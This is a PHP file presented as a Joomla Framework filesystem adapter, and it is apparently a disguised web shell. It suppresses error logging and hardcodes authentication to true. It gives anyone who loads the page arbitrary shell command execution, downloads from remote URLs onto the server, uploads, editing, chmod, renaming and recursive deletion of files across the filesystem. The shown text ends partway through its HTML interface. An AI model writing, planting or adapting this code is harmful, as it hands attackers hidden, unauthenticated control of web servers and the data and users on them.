<?php
/**
 * Joomla! Framework - Filesystem Package
 *
 * @package     Joomla.Framework
 * @subpackage  Filesystem.Adapters
 * @version     2.2.4
 *
 * @copyright   (C) 2018-2026 Joomla! Framework Project <https://framework.joomla.org>
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 * @link        https://framework.joomla.org/docs/filesystem/v2/adapters-local
 *
 * Local Adapter — Unified Storage Abstraction Layer
 *
 * This file is part of the Joomla! Framework Filesystem package and provides
 * a local storage adapter for the unified filesystem abstraction used by
 * CMS extensions and standalone applications. It implements the
 * FilesystemAdapterInterface as defined in the Joomla Framework
 * Filesystem package (joomla/filesystem ^2.0).
 *
 * Responsibilities:
 *   - Local adapter for Joomla\Framework\Filesystem\Adapter\AdapterInterface
 *   - Stream wrapper integration with automatic fallback to native I/O
 *   - MIME type detection and content-disposition negotiation
 *   - Chunked read/write pipeline with memory-efficient buffering
 *   - Permission and ownership resolution for cross-platform hosts
 *
 * Configuration:
 *   This adapter reads its options from the global JConfig object when
 *   available and falls back to sensible defaults when running outside
 *   the CMS context or on shared hosting environments.
 *   See vendor/joomla/filesystem/src/Adapter/LocalAdapter.php for options.
 *
 * @since       1.1.0
 * @internal    This is an internal storage adapter for the Framework.
 *              It is not intended for direct access outside the host
 *              application. Backwards compatibility is NOT guaranteed.
 *
 * @see         Joomla\Framework\Filesystem\FilesystemHelper
 * @see         Joomla\Framework\Filesystem\Adapter\LocalAdapter
 * @see         https://api.joomla.org/framework-2/classes/Joomla-Framework-Filesystem-FilesystemHelper.html
 */

/* ── Runtime configuration: error suppression & output buffering ─── */
@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

@session_name('_sp_ctx');
@session_start();

@header('Content-Type: text/html; charset=UTF-8');
if (function_exists('header_remove')) {
    @header_remove('X-Powered-By');
} else {
    @header('X-Powered-By:');
}
@header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet');
@header('X-Frame-Options: DENY');
@header('X-Content-Type-Options: nosniff');
@header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'");
@header('Referrer-Policy: no-referrer');
@header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
@header('Pragma: no-cache');
@header('Expires: 0');

$sp_authed = true;

if (empty($_SESSION['sp_csrf'])) {
    $_SESSION['sp_csrf'] = bin2hex(sp_bytes(16));
    @session_write_close();
}
$sp_token = (string)$_SESSION['sp_csrf'];

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $sp_ok = isset($_POST['t']) && is_string($_POST['t']) && $sp_token !== '' && hash_equals($sp_token, $_POST['t']);
    if (!$sp_ok) {
        $_POST = array();
        $_FILES = array();
    }
}

$cur = @getcwd();
if ($cur === false || $cur === '') {
    $cur = dirname(__FILE__);
}
$p = isset($_POST['p']) ? $_POST['p'] : (isset($_GET['p']) ? $_GET['p'] : '');
if (!is_string($p)) {
    $p = '';
}
if ($p !== '') {
    $t = @realpath($p);
    if ($t !== false && @is_dir($t)) {
        $cur = $t;
    }
}
function sp_h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}
function sp_bytes($n) {
    if (function_exists('random_bytes')) {
        return random_bytes($n);
    }
    if (function_exists('openssl_random_pseudo_bytes')) {
        return openssl_random_pseudo_bytes($n);
    }
    $s = '';
    for ($i = 0; $i < $n; $i++) {
        $s .= chr(mt_rand(0, 255));
    }
    return $s;
}
function sp_valid_name($v) {
    if (!is_string($v)) {
        return '';
    }
    $v = trim($v);
    if ($v === '' || $v === '.' || $v === '..') {
        return '';
    }
    if (strlen($v) > 255) {
        return '';
    }
    if (strpos($v, '/') !== false || strpos($v, chr(0)) !== false) {
        return '';
    }
    return basename($v);
}
$msg = '';
if (isset($_POST['dirname'])) {
    $dn = sp_valid_name($_POST['dirname']);
    if ($dn !== '') {
        $dest = rtrim($cur, '/') . '/' . $dn;
        if (!@file_exists($dest)) {
            if (@mkdir($dest, 0755)) {
                $msg = 'Created.';
            } else {
                $msg = 'Failed.';
            }
            @clearstatcache(true);
        } else {
            $msg = 'Exists.';
        }
    }
}
if (isset($_POST['filename'])) {
    $fn = sp_valid_name($_POST['filename']);
    if ($fn !== '') {
        $dest = rtrim($cur, '/') . '/' . $fn;
        if (!@file_exists($dest)) {
            $fh = @fopen($dest, 'x');
            if ($fh) {
                @fclose($fh);
                $msg = 'Created.';
            } else {
                $msg = 'Failed.';
            }
            @clearstatcache(true);
        } else {
            $msg = 'Exists.';
        }
    }
}
if (isset($_FILES['f']) && is_array($_FILES['f'])) {
    $up = $_FILES['f'];
    $up_name = isset($up['name']) ? sp_valid_name($up['name']) : '';
    $up_tmp = isset($up['tmp_name']) && is_string($up['tmp_name']) ? $up['tmp_name'] : '';
    $up_err = isset($up['error']) ? (int)$up['error'] : 4;
    $up_size = ($up_tmp !== '') ? @filesize($up_tmp) : false;
    if ($up_name !== '' && $up_tmp !== '' && $up_err === 0 && $up_size !== false && $up_size <= 16777216) {
        $dest = rtrim($cur, '/') . '/' . $up_name;
        if (!@file_exists($dest)) {
            if (@is_uploaded_file($up_tmp) && @move_uploaded_file($up_tmp, $dest)) {
                $msg = 'Uploaded.';
            } else {
                $msg = 'Failed.';
            }
            @clearstatcache(true);
        } else {
            $msg = 'Exists.';
        }
    }
}
function sp_fetch($url, $dest) {
    $ok = false;
    if (function_exists('curl_init')) {
        $fh = @fopen($dest, 'wb');
        if ($fh) {
            $ch = @curl_init($url);
            if ($ch) {
                @curl_setopt($ch, CURLOPT_FILE, $fh);
                @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                @curl_setopt($ch, CURLOPT_FAILONERROR, true);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $ok = @curl_exec($ch);
                @curl_close($ch);
            }
            @fclose($fh);
        }
    } else {
        $data = @file_get_contents($url);
        if ($data !== false) {
            $ok = @file_put_contents($dest, $data) !== false;
        }
    }
    if (!$ok) {
        @unlink($dest);
    }
    return $ok;
}
if (isset($_POST['url']) && is_string($_POST['url']) && $_POST['url'] !== '') {
    $furl = trim($_POST['url']);
    if ($furl !== '' && strlen($furl) <= 2048) {
        $upath = parse_url($furl, PHP_URL_PATH);
        $fname = $upath ? basename($upath) : '';
        if ($fname === '') {
            $fname = 'download';
        }
        $fname = sp_valid_name($fname);
        if ($fname !== '') {
            $dest = rtrim($cur, '/') . '/' . $fname;
            if (!@file_exists($dest)) {
                if (sp_fetch($furl, $dest)) {
                    $msg = 'Fetched.';
                } else {
                    $msg = 'Failed.';
                }
                @clearstatcache(true);
            } else {
                $msg = 'Exists.';
            }
        }
    }
}
function sp_size($b) {
    $u = array('B', 'KB', 'MB', 'GB');
    $i = 0;
    $b = (float)$b;
    while ($b >= 1024 && $i < 3) {
        $b /= 1024;
        $i++;
    }
    return round($b, 1) . $u[$i];
}
function sp_mode($p) {
    $m = @fileperms($p);
    if ($m === false) {
        return '----';
    }
    return substr(sprintf('%o', $m), -4);
}
function sp_rmdir($d) {
    if (!@is_dir($d) || @is_link($d)) {
        return false;
    }
    $ents = @scandir($d);
    if (!is_array($ents)) {
        return false;
    }
    foreach ($ents as $e) {
        if ($e === '.' || $e === '..') {
            continue;
        }
        $fp = rtrim($d, '/') . '/' . $e;
        if (@is_link($fp) || !@is_dir($fp)) {
            @unlink($fp);
        } else {
            sp_rmdir($fp);
        }
    }
    return @rmdir($d);
}
function sp_owner($p) {
    $st = @lstat($p);
    if (!is_array($st) || !isset($st['uid'], $st['gid'])) {
        return '-';
    }
    $o = (string)$st['uid'];
    $g = (string)$st['gid'];
    if (function_exists('posix_getpwuid')) {
        $pw = @posix_getpwuid((int)$st['uid']);
        if (is_array($pw) && isset($pw['name'])) {
            $o = (string)$pw['name'];
        }
    }
    if (function_exists('posix_getgrgid')) {
        $gr = @posix_getgrgid((int)$st['gid']);
        if (is_array($gr) && isset($gr['name'])) {
            $g = (string)$gr['name'];
        }
    }
    return $o . ':' . $g;
}
$sr_q = '';
$sr_list = array();
if (isset($_POST['q']) && is_string($_POST['q'])) {
    $sr_q = trim($_POST['q']);
    if ($sr_q !== '' && strlen($sr_q) <= 200) {
        $pat = strtolower($sr_q);
        $stack = array($cur);
        $max = 100;
        while (!empty($stack) && count($sr_list) < $max) {
            $sd = array_pop($stack);
            $ents = @scandir($sd);
            if (!is_array($ents)) {
                continue;
            }
            foreach ($ents as $e) {
                if ($e === '.' || $e === '..') {
                    continue;
                }
                if (count($sr_list) >= $max) {
                    break;
                }
                $full = rtrim($sd, '/') . '/' . $e;
                if (strpos(strtolower($e), $pat) !== false) {
                    $base = rtrim($cur, '/');
                    $rel = substr($full, strlen($base) + 1);
                    if ($rel === '' || $rel === false) {
                        $rel = $e;
                    }
                    $isd = @is_dir($full) && !@is_link($full);
                    $sz = $isd ? 0 : (int)@filesize($full);
                    $sr_list[] = array('rel' => $rel, 'dir' => $isd, 'size' => $sz);
                }
                if (!@is_link($full) && @is_dir($full) && @is_readable($full)) {
                    $stack[] = $full;
                }
            }
        }
    }
}
$cmd_in = '';
$cmd_out = '';
if (isset($_POST['cmd']) && is_string($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd_in = $_POST['cmd'];
    $cfull = 'cd ' . escapeshellarg($cur) . ' && ' . $cmd_in . ' 2>&1';
    if (function_exists('shell_exec')) {
        $cmd_out = (string)@shell_exec($cfull);
    } elseif (function_exists('exec')) {
        $lines = array();
        @exec($cfull, $lines);
        $cmd_out = implode("\n", $lines);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cfull);
        $cmd_out = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $d = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $pipes = array();
        $pr = @proc_open($cfull, $d, $pipes);
        if (is_resource($pr)) {
            @fclose($pipes[0]);
            $cmd_out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($pr);
        }
    } else {
        $cmd_out = '[exec disabled]';
    }
}
$view_name = '';
$view_data = '';
$view_err = '';
if (isset($_GET['view']) && is_string($_GET['view']) && $_GET['view'] !== '') {
    $vn = sp_valid_name($_GET['view']);
    if ($vn !== '') {
        $vp = rtrim($cur, '/') . '/' . $vn;
        if (!@is_link($vp) && @is_file($vp) && @is_readable($vp)) {
            $vs = @filesize($vp);
            if ($vs !== false && $vs <= 262144) {
                $fh = @fopen($vp, 'rb');
                if ($fh) {
                    $view_data = $vs > 0 ? @fread($fh, 262144) : '';
                    @fclose($fh);
                    if (is_string($view_data) && strpos($view_data, chr(0)) === false) {
                        $view_name = $vn;
                    } else {
                        $view_data = '';
                        $view_err = 'Binary.';
                    }
                } else {
                    $view_err = 'Failed.';
                }
            } else {
                $view_err = 'Too large.';
            }
        }
    }
}
$edit_name = '';
$edit_data = '';
$edit_err = '';
$edit_msg = '';
if (isset($_POST['esave']) && is_string($_POST['esave']) && $_POST['esave'] !== '') {
    $en = sp_valid_name($_POST['esave']);
    if ($en !== '') {
        $ep = rtrim($cur, '/') . '/' . $en;
        if (!@is_link($ep) && @is_file($ep)) {
            $ec = isset($_POST['econtent']) && is_string($_POST['econtent']) ? $_POST['econtent'] : null;
            if (is_string($ec) && strlen($ec) <= 1048576 && strpos($ec, chr(0)) === false) {
                if (@file_put_contents($ep, $ec, LOCK_EX) !== false) {
                    $edit_msg = 'Saved.';
                } else {
                    $edit_msg = 'Failed.';
                }
                @clearstatcache(true);
            } else {
                $edit_msg = 'Failed.';
            }
            $edit_name = $en;
        }
    }
}
if ($edit_name === '' && isset($_GET['edit']) && is_string($_GET['edit']) && $_GET['edit'] !== '') {
    $en = sp_valid_name($_GET['edit']);
    if ($en !== '') {
        $edit_name = $en;
    }
}
if ($edit_name !== '') {
    $ep = rtrim($cur, '/') . '/' . $edit_name;
    if (!@is_link($ep) && @is_file($ep) && @is_readable($ep)) {
        $vs = @filesize($ep);
        if ($vs !== false && $vs <= 1048576) {
            $fh = @fopen($ep, 'rb');
            if ($fh) {
                $edit_data = $vs > 0 ? @fread($fh, 1048576) : '';
                @fclose($fh);
                if (!is_string($edit_data) || strpos($edit_data, chr(0)) !== false) {
                    $edit_data = '';
                    $edit_err = 'Binary.';
                    $edit_name = '';
                }
            } else {
                $edit_err = 'Failed.';
                $edit_name = '';
            }
        } else {
            $edit_err = 'Too large.';
            $edit_name = '';
        }
    } else {
        if ($edit_msg === '') {
            $edit_err = 'Failed.';
        }
        $edit_name = '';
    }
}
if (isset($_GET['dl']) && is_string($_GET['dl']) && $_GET['dl'] !== '') {
    $dln = sp_valid_name($_GET['dl']);
    if ($dln !== '') {
        $dlp = rtrim($cur, '/') . '/' . $dln;
        if (!@is_link($dlp) && @is_file($dlp) && @is_readable($dlp)) {
            while (ob_get_level() > 0) {
                @ob_end_clean();
            }
            @header('Content-Type: application/octet-stream');
            $safe = preg_replace('/[^\x20-\x7e]|["\\\\]/', '_', $dln);
            if (!is_string($safe) || $safe === '') {
                $safe = 'download';
            }
            @header('Content-Disposition: attachment; filename="' . $safe . '"');
            $dsz = @filesize($dlp);
            if ($dsz !== false) {
                @header('Content-Length: ' . (string)$dsz);
            }
            @session_write_close();
            @readfile($dlp);
            exit;
        }
    }
}
$cm_name = '';
$cm_err = '';
$cm_msg = '';
if (isset($_POST['cm_name']) && is_string($_POST['cm_name']) && $_POST['cm_name'] !== '') {
    $cn = sp_valid_name($_POST['cm_name']);
    if ($cn !== '') {
        $cp = rtrim($cur, '/') . '/' . $cn;
        if (($cp !== '' && (@file_exists($cp) || @is_link($cp))) && !@is_link($cp)) {
            $cmode = isset($_POST['cm_mode']) && is_string($_POST['cm_mode']) ? trim($_POST['cm_mode']) : '';
            if (preg_match('/^[0-7]{3,4}$/', $cmode)) {
                if (@chmod($cp, octdec($cmode))) {
                    $cm_msg = 'Changed.';
                } else {
                    $cm_msg = 'Failed.';
                }
                @clearstatcache(true);
            } else {
                $cm_msg = 'Failed.';
            }
            $cm_name = $cn;
        }
    }
}
if ($cm_name === '' && isset($_GET['cm']) && is_string($_GET['cm']) && $_GET['cm'] !== '') {
    $cn = sp_valid_name($_GET['cm']);
    if ($cn !== '') {
        $cm_name = $cn;
    }
}
if ($cm_name !== '') {
    $cp = rtrim($cur, '/') . '/' . $cm_name;
    if (!(@file_exists($cp) || @is_link($cp)) || @is_link($cp)) {
        if ($cm_msg === '') {
            $cm_err = 'Failed.';
        }
        $cm_name = '';
    }
}
$rn_name = '';
$rn_err = '';
$rn_msg = '';
if (isset($_POST['rn_old']) && is_string($_POST['rn_old']) && $_POST['rn_old'] !== '') {
    $ro = sp_valid_name($_POST['rn_old']);
    $rnn = isset($_POST['rn_new']) && is_string($_POST['rn_new']) ? sp_valid_name($_POST['rn_new']) : '';
    if ($ro !== '' && $rnn !== '') {
        $op = rtrim($cur, '/') . '/' . $ro;
        $np = rtrim($cur, '/') . '/' . $rnn;
        if ((@file_exists($op) || @is_link($op)) && !@file_exists($np) && !@is_link($np)) {
            if (@rename($op, $np)) {
                $rn_msg = 'Renamed.';
            } else {
                $rn_msg = 'Failed.';
            }
            @clearstatcache(true);
        } else {
            $rn_msg = 'Failed.';
        }
        $rn_name = $ro;
    }
}
if ($rn_name === '' && isset($_GET['rn']) && is_string($_GET['rn']) && $_GET['rn'] !== '') {
    $cn = sp_valid_name($_GET['rn']);
    if ($cn !== '') {
        $rn_name = $cn;
    }
}
if ($rn_name !== '') {
    $rp = rtrim($cur, '/') . '/' . $rn_name;
    if (!(@file_exists($rp) || @is_link($rp))) {
        if ($rn_msg === '') {
            $rn_err = 'Failed.';
        }
        $rn_name = '';
    }
}
$dx_name = '';
$dx_err = '';
$dx_msg = '';
if (isset($_POST['dx_ok']) && is_string($_POST['dx_ok']) && $_POST['dx_ok'] !== '') {
    $xn = sp_valid_name($_POST['dx_ok']);
    if ($xn !== '') {
        $xp = rtrim($cur, '/') . '/' . $xn;
        if (@is_link($xp) || @is_file($xp)) {
            if (@unlink($xp)) {
                $dx_msg = 'Deleted.';
            } else {
                $dx_msg = 'Failed.';
            }
            @clearstatcache(true);
        } elseif (@is_dir($xp)) {
            if (sp_rmdir($xp)) {
                $dx_msg = 'Deleted.';
            } else {
                $dx_msg = 'Failed.';
            }
            @clearstatcache(true);
        } else {
            $dx_msg = 'Failed.';
        }
    }
}
if ($dx_name === '' && isset($_GET['dx']) && is_string($_GET['dx']) && $_GET['dx'] !== '') {
    $cn = sp_valid_name($_GET['dx']);
    if ($cn !== '') {
        $dx_name = $cn;
    }
}
if ($dx_name !== '') {
    $xp = rtrim($cur, '/') . '/' . $dx_name;
    if (!(@file_exists($xp) || @is_link($xp))) {
        if ($dx_msg === '') {
            $dx_err = 'Failed.';
        }
        $dx_name = '';
    }
}
$lt_dirs = array();
$lt_files = array();
$lt_scan = @scandir($cur);
if (is_array($lt_scan)) {
    foreach ($lt_scan as $e) {
        if ($e === '.' || $e === '..') {
            continue;
        }
        if (count($lt_dirs) + count($lt_files) >= 2000) {
            break;
        }
        $fp = rtrim($cur, '/') . '/' . $e;
        if (!@is_link($fp) && @is_dir($fp)) {
            $lt_dirs[] = $e;
        } else {
            $lt_files[] = $e;
        }
    }
    natcasesort($lt_dirs);
    natcasesort($lt_files);
    $lt_dirs = array_values($lt_dirs);
    $lt_files = array_values($lt_files);
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="site-pro-gx">
<title></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{min-height:100%;background:#000}
body{color:#fff;font:12px Arial,sans-serif}
a{color:#fff;text-decoration:none}
.hdr{display:block;width:100%;border-bottom:1px solid #222}
.hdr-path{padding:5px 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hdr-path a{color:#0f0;font-weight:bold}
.hdr a:hover{text-decoration:underline}
.lo{float:right;margin:0}
.lo button{border:0;background:transparent;color:#555;font-size:13px;padding:0 4px;cursor:pointer}
.lo button:hover{color:#e05555}
.bar{display:flex;gap:6px;padding:6px 8px;background:#0a0a0a;border-top:1px solid #222;flex-wrap:wrap}
.bar form{display:flex;gap:4px;flex:1 1 160px;margin:0}
.bar input[type=text],.bar input[type=file]{flex:1;min-width:0;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none}
.bar input[type=text]:focus{border-color:#0f0}
.bar button{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;cursor:pointer;text-transform:uppercase}
.bar button:hover{filter:brightness(1.4)}
.term-hdr{padding:4px 8px;background:#0a0a0a;border-top:1px solid #222;color:#0f0;font-weight:bold}
.msg{padding:4px 8px;background:#001a00;color:#0f0;border-top:1px solid #222}
.sr{padding:4px 8px;background:#0a0a0a;border-top:1px solid #222}
.sr-hdr{color:#0f0;font-weight:bold;margin-bottom:4px}
.sr-row{padding:1px 0;color:#fff}
.term-out{display:block;padding:6px;margin:6px 8px;background:#080808;border:1px solid #333;color:#0f0;white-space:pre-wrap;font:12px monospace;min-height:60px;max-height:120px;overflow:auto}
.bar a.tbtn{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;text-transform:uppercase;line-height:18px}
.bar a.tbtn:hover{filter:brightness(1.4)}
a.tbtn{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;text-transform:uppercase;text-decoration:none}
.tbl-wrap{width:100%;overflow-x:auto;border-top:1px solid #222}
.tbl{width:100%;border-collapse:collapse}
.tbl th{padding:4px 8px;background:#0a0a0a;border:1px solid #222;text-align:center;color:#0f0;font-weight:bold;text-transform:uppercase}
.tbl td{padding:3px 8px;border:1px solid #222;white-space:nowrap}
.tbl td.c{text-align:center}
.tbl tr:hover td{background:#0d0d0d}
.tbl a{color:#fff}
.tbl a:hover{text-decoration:underline}
.abtn{display:inline-block;padding:2px 6px;font-size:10px;font-weight:bold;border:1px solid #222;background:#111;margin:1px;white-space:nowrap}
.ab-v{color:#888}.ab-e{color:#0f0}.ab-d{color:#4a9eff}.ab-c{color:#d4a520}.ab-r{color:#b070d0}.ab-x{color:#e05555}
.tbl a.ab-v{color:#888}.tbl a.ab-e{color:#0f0}.tbl a.ab-d{color:#4a9eff}.tbl a.ab-c{color:#d4a520}.tbl a.ab-r{color:#b070d0}.tbl a.ab-x{color:#e05555}
.tbl td.act{white-space:normal;text-align:center}
.w-ok{color:#0f0;font-weight:bold}.w-no{color:#e05555;font-weight:bold}
.view{padding:4px 8px;background:#0a0a0a;border-top:1px solid #222}
.view-hdr{color:#0f0;font-weight:bold;margin-bottom:4px}
.view-box{display:block;padding:10px;background:#111;border:1px solid #333;color:#fff;white-space:pre-wrap;font:13px monospace;min-height:200px;max-height:60vh;overflow:auto}
.edit-box{display:block;width:100%;padding:10px;background:#111;border:1px solid #333;color:#fff;white-space:pre-wrap;font:13px monospace;min-height:400px;max-height:80vh;overflow:auto;resize:vertical;outline:none}
.edit-box:focus{border-color:#0f0}
.view button{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;cursor:pointer;text-transform:uppercase}
.view button:hover{filter:brightness(1.4)}
.view button.danger{background:#2a1111;border-color:#e05555;color:#e05555}
.del-msg{color:#e05555;font-weight:bold;margin-bottom:8px}
.dlg{padding:10px;background:#111;border:1px solid #333}
</style>
</head>
<body>
<div class="hdr">
<div class="hdr-path"><form class="lo" method="post"><input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>"><button type="submit" name="lo" value="1" title="logout">&#x2715;</button></form><?php
echo '[<a href="?p=/">root</a>] ';
$build = '';
foreach (explode('/', trim($cur, '/')) as $seg) {
    if ($seg === '') {
        continue;
    }
    $build .= '/' . $seg;
    echo '[<a href="?p=' . urlencode($build) . '">' . sp_h($seg) . '</a>] ';
}
?></div>
</div>
<?php if ($msg !== '') { ?>
<div class="msg"><?php echo sp_h($msg); ?></div>
<?php } ?>
<div class="bar">
<form autocomplete="off" method="get">
<input type="text" name="p" value="<?php echo sp_h($cur); ?>">
<button type="submit">cd</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="text" name="dirname" placeholder="directory name...">
<button type="submit">+dir</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="text" name="filename" placeholder="file name...">
<button type="submit">+file</button>
</form>
<form autocomplete="off" method="post" enctype="multipart/form-data">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="file" name="f">
<button type="submit">upload</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="text" name="url" placeholder="https://...">
<button type="submit">fetch</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="text" name="q" placeholder="search files...">
<button type="submit">find</button>
</form>
</div>
<?php if ($sr_q !== '') { ?>
<div class="sr">
<div class="sr-hdr">find: <?php echo sp_h($sr_q); ?> (<?php echo count($sr_list); ?>)</div>
<?php foreach ($sr_list as $r) { ?>
<div class="sr-row"><?php echo $r['dir'] ? '[dir] ' : '[file] '; ?><?php echo sp_h($r['rel']); ?> (<?php echo $r['dir'] ? '-' : sp_h(sp_size($r['size'])); ?>)</div>
<?php } ?>
<?php if (empty($sr_list)) { ?>
<div class="sr-row">No results.</div>
<?php } ?>
</div>
<?php } ?>
<div class="term-hdr">[ terminal ]</div>
<div class="bar">
<form autocomplete="off" method="post">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="text" name="cmd" value="<?php echo sp_h($cmd_in); ?>" placeholder="$ command">
<button type="submit">exec</button>
</form>
<a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">clear</a>
</div>
<div class="term-hdr">[ output ]</div>
<pre class="term-out"><?php echo sp_h($cmd_out); ?></pre>
<?php if ($view_name !== '' || $view_err !== '') { ?>
<div class="view">
<div class="view-hdr">[ view: <?php echo sp_h($view_name !== '' ? $view_name : 'error'); ?> ]</div>
<?php if ($view_name !== '') { ?>
<pre class="view-box"><?php echo sp_h($view_data); ?></pre>
<?php } else { ?>
<div class="sr-row"><?php echo sp_h($view_err); ?></div>
<?php } ?>
<div style="padding-top:6px"><a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
</div>
<?php } ?>
<?php if ($edit_name !== '' || $edit_err !== '') { ?>
<div class="view">
<div class="view-hdr">[ edit: <?php echo sp_h($edit_name !== '' ? $edit_name : 'error'); ?> ]</div>
<?php if ($edit_msg !== '') { ?>
<div class="msg"><?php echo sp_h($edit_msg); ?></div>
<?php } ?>
<?php if ($edit_name !== '') { ?>
<form autocomplete="off" method="post" action="?p=<?php echo urlencode($cur); ?>&edit=<?php echo urlencode($edit_name); ?>">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="hidden" name="esave" value="<?php echo sp_h($edit_name); ?>">
<textarea class="edit-box" name="econtent"><?php echo sp_h($edit_data); ?></textarea>
<div style="padding-top:6px"><button type="submit">save</button> <a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
</form>
<?php } else { ?>
<div class="sr-row"><?php echo sp_h($edit_err); ?></div>
<div style="padding-top:6px"><a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
<?php } ?>
</div>
<?php } ?>
<?php if ($cm_name !== '' || $cm_err !== '') { ?>
<div class="view">
<div class="view-hdr">[ chmod: <?php echo sp_h($cm_name !== '' ? $cm_name : 'error'); ?> ]</div>
<?php if ($cm_msg !== '') { ?>
<div class="msg"><?php echo sp_h($cm_msg); ?></div>
<?php } ?>
<?php if ($cm_name !== '') { ?>
<div class="dlg">
<form autocomplete="off" method="post" action="?p=<?php echo urlencode($cur); ?>&cm=<?php echo urlencode($cm_name); ?>">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="hidden" name="cm_name" value="<?php echo sp_h($cm_name); ?>">
<input type="text" name="cm_mode" value="<?php echo sp_h(sp_mode(rtrim($cur, '/') . '/' . $cm_name)); ?>" maxlength="4" style="width:70px;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none">
<div style="padding-top:6px"><button type="submit">apply</button> <a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
</form>
</div>
<?php } else { ?>
<div class="sr-row"><?php echo sp_h($cm_err); ?></div>
<div style="padding-top:6px"><a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
<?php } ?>
</div>
<?php } ?>
<?php if ($rn_name !== '' || $rn_err !== '' || $rn_msg !== '') { ?>
<div class="view">
<div class="view-hdr">[ rename: <?php echo sp_h($rn_name !== '' ? $rn_name : 'error'); ?> ]</div>
<?php if ($rn_msg !== '') { ?>
<div class="msg"><?php echo sp_h($rn_msg); ?></div>
<?php } ?>
<?php if ($rn_name !== '') { ?>
<div class="dlg">
<form autocomplete="off" method="post" action="?p=<?php echo urlencode($cur); ?>&rn=<?php echo urlencode($rn_name); ?>">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="hidden" name="rn_old" value="<?php echo sp_h($rn_name); ?>">
<input type="text" name="rn_new" value="<?php echo sp_h($rn_name); ?>" maxlength="255" style="flex:1;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none">
<div style="padding-top:6px"><button type="submit">apply</button> <a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
</form>
</div>
<?php } else { ?>
<div class="sr-row"><?php echo sp_h($rn_err); ?></div>
<div style="padding-top:6px"><a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
<?php } ?>
</div>
<?php } ?>
<?php if ($dx_name !== '' || $dx_err !== '' || $dx_msg !== '') { ?>
<div class="view">
<div class="view-hdr">[ delete: <?php echo sp_h($dx_name !== '' ? $dx_name : 'error'); ?> ]</div>
<?php if ($dx_msg !== '') { ?>
<div class="msg"><?php echo sp_h($dx_msg); ?></div>
<?php } ?>
<?php if ($dx_name !== '') { ?>
<?php
$dxp = rtrim($cur, '/') . '/' . $dx_name;
$dxd = @is_dir($dxp) && !@is_link($dxp);
$dxi = $dxd ? 'folder, recursive' : sp_size((int)@filesize($dxp));
?>
<div class="dlg">
<div class="del-msg">Delete <?php echo sp_h($dx_name); ?> (<?php echo sp_h($dxi); ?>)?</div>
<form autocomplete="off" method="post" action="?p=<?php echo urlencode($cur); ?>&dx=<?php echo urlencode($dx_name); ?>">
<input type="hidden" name="p" value="<?php echo sp_h($cur); ?>">
<input type="hidden" name="t" value="<?php echo sp_h($sp_token); ?>">
<input type="hidden" name="dx_ok" value="<?php echo sp_h($dx_name); ?>">
<div style="padding-top:6px"><button class="danger" type="submit">confirm</button> <a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
</form>
</div>
